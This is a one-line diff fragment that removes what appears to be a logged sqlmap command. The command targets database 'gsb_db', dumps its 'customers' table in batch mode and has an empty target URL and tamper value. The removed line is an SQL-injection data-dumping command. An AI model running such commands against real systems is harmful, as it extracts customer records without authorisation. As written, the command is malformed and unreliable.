@@ -1,1 +1,0 @@
-http://--tamper= (GET)  # C:\Users\Administrator\AppData\Local\Programs\Python\Python311\Scripts\sqlmap -u --tamper= -D gsb_db -T customers --dump --batch --output-dir=gsb_results
